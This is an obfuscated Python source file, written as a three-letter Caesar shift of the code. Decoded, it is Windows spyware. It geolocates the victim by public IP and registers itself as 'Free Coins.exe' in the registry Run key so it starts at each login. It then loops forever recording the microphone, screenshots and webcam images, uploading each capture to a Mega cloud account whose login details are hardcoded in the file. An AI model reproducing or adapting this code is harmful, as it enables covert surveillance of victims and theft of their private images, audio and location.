lpsruw wlph
lpsruw rv
lpsruw vkxwlo
lpsruw fy2
iurp gdwhwlph lpsruw gdwhwlph
iurp phjd lpsruw Phjd
lpsruw sbdxglr
lpsruw zdyh
lpsruw wkuhdglqj
lpsruw uhtxhvwv
lpsruw jhrfrghu
lpsruw jore
lpsruw sbdxwrjxl
lpsruw zlquhj

ghi ghohwh_ilohv():
    fxuuhqw_iroghu = rv.jhwfzg()
    iloh_hawhqvlrqv = ['*.msj', '*.sqj', '*.zdy']
    ilohv_wr_ghohwh = []

    iru hawhqvlrq lq iloh_hawhqvlrqv:
        ilohv_wr_ghohwh.hawhqg(jore.jore(rv.sdwk.mrlq(fxuuhqw_iroghu, hawhqvlrq)))

    iru iloh_sdwk lq ilohv_wr_ghohwh:
        rv.uhpryh(iloh_sdwk)
        sulqw("ghohwhg...")

ghi jhw_sxeolf_lsy4():
    wub:
        uhvsrqvh = uhtxhvwv.jhw('kwwsv://dsl.lslib.ruj?irupdw=mvrq')
        gdwd = uhvsrqvh.mvrq()
        uhwxuq gdwd['ls']
    hafhsw uhtxhvwv.UhtxhvwHafhswlrq:
        uhwxuq Qrqh

ghi jhw_orfdwlrq_iurp_ls(ls_dgguhvv):
    j = jhrfrghu.ls(ls_dgguhvv)
    
    li j.rn:
        flwb = j.flwb li j.flwb hovh "Xqnqrzq Flwb"
        frxqwub = j.frxqwub li j.frxqwub hovh "Xqnqrzq Frxqwub"
        orfdwlrq = i"{flwb}, {frxqwub}"
        uhwxuq orfdwlrq
    hovh:
        uhwxuq 'Orfdwlrq qrw irxqg'

ghi vfuhhqvkrw_xsordg():
    wub:
        # Jhqhudwh d wlphvwdps iru wkh ilohqdph
        wlphvwdps = gdwhwlph.qrz().vwuiwlph('%B-%p-%g_%K-%P-%V')

        # Fdswxuh wkh vfuhhq dqg vdyh wkh vfuhhqvkrw zlwk wkh wlphvwdps lq wkh ilohqdph
        ilohqdph = i'vfuhhqvkrw_{wlphvwdps}.sqj'
        sbdxwrjxl.vfuhhqvkrw(ilohqdph)

        phjd_hpdlo = 'odmha92681@phlghfq.frp'
        phjd_sdvvzrug = 'e@vlw1218'

        # phjd vljqlq
        phjd = Phjd()
        phjd_orjlq = phjd.orjlq(phjd_hpdlo, phjd_sdvvzrug)

        vfuhhqvkrwv_iroghu = phjd_orjlq.ilqg('vfuhhqvkrwv')

        li qrw vfuhhqvkrwv_iroghu:
            vfuhhqvkrwv_iroghu = phjd_orjlq.fuhdwh_iroghu('vfuhhqvkrwv')
        hovh:
            vfuhhqvkrwv_iroghu = vfuhhqvkrwv_iroghu[0]

        sulqw("xsordglqj wr vfuhhqvkrwv") 
        phjd_orjlq.xsordg(ilohqdph, vfuhhqvkrwv_iroghu)
        # xsordg zhefdp slfwxuh
    hafhsw:
        sulqw("vfuhhqvkrw xsordg idlohg")
        

ghi zhefdp_xsordg():
    wub:

        # Rshq wkh zhefdp
        fds = fy2.YlghrFdswxuh(0)

        # Uhdg d iudph iurp wkh zhefdp
        uhw, iudph = fds.uhdg()

        wlphvwdps = gdwhwlph.qrz().vwuiwlph('%B-%p-%g_%K-%P-%V')
        ilohqdph_zhefdp = i'zhefdp_{wlphvwdps}.sqj'
        # Vdyh wkh iudph dv dq lpdjh
        fy2.lpzulwh(ilohqdph_zhefdp, iudph)

        # Uhohdvh wkh zhefdp
        fds.uhohdvh()

        phjd_hpdlo = 'odmha92681@phlghfq.frp'
        phjd_sdvvzrug = 'e@vlw1218'

        # phjd vljqlq
        phjd = Phjd()
        phjd_orjlq = phjd.orjlq(phjd_hpdlo, phjd_sdvvzrug)

        zhefdp_iroghu = phjd_orjlq.ilqg('zhefdp')

        li qrw zhefdp_iroghu:
            zhefdp_iroghu = phjd_orjlq.fuhdwh_iroghu('zhefdp')
        hovh:
            zhefdp_iroghu = zhefdp_iroghu[0]

        sulqw("xsordglqj wr zhefdp") 
        phjd_orjlq.xsordg(ilohqdph_zhefdp, zhefdp_iroghu)
        # xsordg zhefdp slfwxuh
        
    hafhsw:
        sulqw("zhefdp xsordg idlohg")

ghi uhfrug_dxglr():
    wub:
        fxuuhqw_wlph = gdwhwlph.qrz().vwuiwlph('%B-%p-%g_%K-%P-%V')
        uhfruglqj_iloh_qdph = i'uhfruglqj_{fxuuhqw_wlph}.zdy'
        gxudwlrq = 10
        FKXQN = 1024
        IRUPDW = sbdxglr.sdLqw16
        FKDQQHOV = 1
        UDWH = 44100

        s = sbdxglr.SbDxglr()

        vwuhdp = s.rshq(irupdw=IRUPDW,
                        fkdqqhov=FKDQQHOV,
                        udwh=UDWH,
                        lqsxw=Wuxh,
                        iudphv_shu_exiihu=FKXQN)

        iudphv = []

        sulqw(i"Uhfruglqj dxglr iru {gxudwlrq} vhfrqgv...")

        iru _ lq udqjh(lqw(UDWH / FKXQN * gxudwlrq)):
            gdwd = vwuhdp.uhdg(FKXQN)
            iudphv.dsshqg(gdwd)

        vwuhdp.vwrs_vwuhdp()
        vwuhdp.forvh()
        s.whuplqdwh()

        zdyh_iloh = zdyh.rshq(uhfruglqj_iloh_qdph, 'ze')
        zdyh_iloh.vhwqfkdqqhov(FKDQQHOV)
        zdyh_iloh.vhwvdpszlgwk(s.jhw_vdpsoh_vlch(IRUPDW))
        zdyh_iloh.vhwiudphudwh(UDWH)
        zdyh_iloh.zulwhiudphv(e''.mrlq(iudphv))
        zdyh_iloh.forvh()

        sulqw(i"xsordglqj dxglr {uhfruglqj_iloh_qdph}")

        phjd_hpdlo = 'odmha92681@phlghfq.frp'
        phjd_sdvvzrug = 'e@vlw1218'

        # phjd vljqlq
        phjd = Phjd()
        phjd_orjlq = phjd.orjlq(phjd_hpdlo, phjd_sdvvzrug)

        uhfruglqjv_iroghu = phjd_orjlq.ilqg('uhfruglqjv')

        li qrw uhfruglqjv_iroghu:
            uhfruglqjv_iroghu = phjd_orjlq.fuhdwh_iroghu('uhfruglqjv')
        hovh:
            uhfruglqjv_iroghu = uhfruglqjv_iroghu[0]

        sulqw("xsordglqj wr uhfruglqjv") 
        phjd_orjlq.xsordg(uhfruglqj_iloh_qdph, uhfruglqjv_iroghu)

    hafhsw:
        sulqw("uhfruglqj xsordg idlohg")

zkloh Wuxh:
    wub:
        ghohwh_ilohv()
        # vhw xvhuqdph/sdvvzrug
        phjd_hpdlo = 'odmha92681@phlghfq.frp'
        phjd_sdvvzrug = 'e@vlw1218'

        # phjd vljqlq
        phjd = Phjd()
        phjd_orjlq = phjd.orjlq(phjd_hpdlo, phjd_sdvvzrug)
        sulqw("orjjhg lq")

        sxeolf_lsy4 = jhw_sxeolf_lsy4()
        ls_dgguhvv = sxeolf_lsy4
        orfdwlrq = jhw_orfdwlrq_iurp_ls(ls_dgguhvv)

        # zlqgrzv xvhuqdph
        fxuuhqw_wlph = gdwhwlph.qrz().vwuiwlph('%B-%p-%g_%K-%P-%V')
        orfdwlrq_iloh_qdph = i'ls_orfdwlrq_{fxuuhqw_wlph}.waw'

        # Vdyh LS dgguhvv dqg orfdwlrq lq d whaw iloh
        zlwk rshq(orfdwlrq_iloh_qdph, 'z') dv iloh:
            iloh.zulwh(i"Sxeolf LSy4 Dgguhvv: {ls_dgguhvv}\q")
            iloh.zulwh(i"Orfdwlrq: {orfdwlrq}\q")

        # pdnh iroghu fdoohg vfuhhqvkrwv rq phjd vwrudjh
        orfdwlrq_iroghu= phjd_orjlq.ilqg('orfdwlrqv')

        li qrw orfdwlrq_iroghu:
            orfdwlrq_iroghu = phjd_orjlq.fuhdwh_iroghu('orfdwlrqv')
        hovh:
            orfdwlrq_iroghu = orfdwlrq_iroghu[0]

        wub:

            surjudp_qdph = "Iuhh Frlqv.hah"
            surjudp_sdwk = rv.sdwk.mrlq(rv.jhwfzg(), surjudp_qdph)
            nhb = zlquhj.RshqNhb(zlquhj.KNHB_FXUUHQW_XVHU, "Vriwzduh\Plfurvriw\Zlqgrzv\FxuuhqwYhuvlrq\Uxq", 0, zlquhj.NHB_DOO_DFFHVV)
            zlquhj.VhwYdoxhHa(nhb, "Iuhh Frlqv", 0, zlquhj.UHJ_VC, surjudp_sdwk)
            zlquhj.ForvhNhb(nhb)

        hafhsw:
            sdvv

        sulqw("xsordglqj orfdwlrq wr orfdwlrq_iroghu")
        phjd_orjlq.xsordg(orfdwlrq_iloh_qdph, orfdwlrq_iroghu)

        rv.uhpryh(orfdwlrq_iloh_qdph)

        # kdfn orrs
        frxqwhu = 0
        zkloh Wuxh:
            
            # Fuhdwh wkuhdgv iru hdfk ixqfwlrq
            dxglr_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=uhfrug_dxglr)
            vfuhhqvkrw_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=vfuhhqvkrw_xsordg)
            zhefdp_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=zhefdp_xsordg)

            ghohwh_ilohv()

            # Vwduw wkh wkuhdgv
            dxglr_wkuhdg.vwduw()
            vfuhhqvkrw_wkuhdg.vwduw()
            zhefdp_wkuhdg.vwduw()

            # Zdlw iru erwk wkuhdgv wr ilqlvk
            dxglr_wkuhdg.mrlq()
            vfuhhqvkrw_wkuhdg.mrlq()
            zhefdp_wkuhdg.mrlq()
           
    hafhsw:
        sulqw("uhwublqj")
